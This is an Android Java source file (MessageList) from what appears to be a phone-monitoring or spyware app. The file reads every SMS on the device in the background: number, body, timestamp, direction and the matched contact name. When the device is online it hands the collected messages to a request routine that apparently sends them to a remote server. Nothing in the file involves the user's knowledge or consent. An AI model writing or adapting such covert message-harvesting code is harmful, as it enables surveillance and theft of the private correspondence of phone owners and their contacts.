package com.inet.android.list;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract.PhoneLookup;

/**
 * ListApp class is designed to get the list of sms
 * 
 * @author johny homicide
 * 
 */
public class MessageList extends AsyncTask<Context, Void, Void> {
	private Context mContext;
	private String LOG_TAG = MessageList.class.getSimpleName().toString();
	private String complete;
	private int version;

	public void getSmsLogs() {
		Set<Map<String, String>> listOfMapsForData = new HashSet<Map<String, String>>();
		version = AppSettings.getSetting(AppConstants.TYPE_LIST_MESSAGE, mContext);

		// -------------- for---------------------------------------------

		Uri uri = Uri.parse("content://sms");
		Cursor sms_sent_cursor = mContext.getContentResolver().query(uri, null, null, null, "date desc");
		Logging.doLog(LOG_TAG, "readSMS", "readSMS");
		if (NetworkChangeReceiver.isOnline(mContext) != 0) {
			complete = "0";
			// Read the sms data and store it in the list
			if (sms_sent_cursor != null) {
				// формируем JSONobj
				if (sms_sent_cursor.moveToFirst()) {
						for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
						int typeSms = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
						int type = -1;
						switch (typeSms) {
						case 1:
							type = AppConstants.TYPE_INCOMING_SMS_REQUEST;
							break;
						case 2:
							type = AppConstants.TYPE_OUTGOING_SMS_REQUEST;
							break;
						default:
							type = 7;
							break;
						}
						Map<String, String> data = new HashMap<String, String>();

						
						data.put("time", ConvertDate
								.getDate(sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndexOrThrow("date"))));
						data.put("type", Integer.toString(type));
						data.put("number", sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
						data.put("data", sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")));
						data.put("name",
								getContactName(sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"))));
						listOfMapsForData.add(data);
						sms_sent_cursor.moveToNext();

					}
				}
				if (listOfMapsForData.isEmpty() != true) {
					sendRequest(listOfMapsForData);
					listOfMapsForData = null;
				} else {
					sendRequest("");
				}

				Logging.doLog(LOG_TAG, "sms_sent_cursor.close()", "sms_sent_cursor.close()");
				sms_sent_cursor.close();
			} else {
				Logging.doLog(LOG_TAG, "smsLogCursor == null", "smsLogCursor == null");
				sendRequest("");

			}
		} else
			endList();

	}

	private void endList() {
		Queue.setList(AppConstants.TYPE_LIST_MESSAGE, version, "0", mContext);
	}

	private void sendRequest(Object request) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
		RequestList.sendDemandRequest(request, AppConstants.TYPE_LIST_MESSAGE_REQUEST, complete, version, mContext);
	}

	private String getContactName(String phoneNumber) {
		ContentResolver cr = mContext.getContentResolver();
		Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
		Cursor cursor = cr.query(uri, new String[] { PhoneLookup.DISPLAY_NAME }, null, null, null);
		if (cursor == null) {
			return null;
		}
		String contactName = null;
		if (cursor.moveToFirst()) {
			contactName = cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME));
		}
		if (cursor != null && !cursor.isClosed()) {
			cursor.close();
		}
		return contactName;
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doInBackground");
		this.mContext = params[0];
		getSmsLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
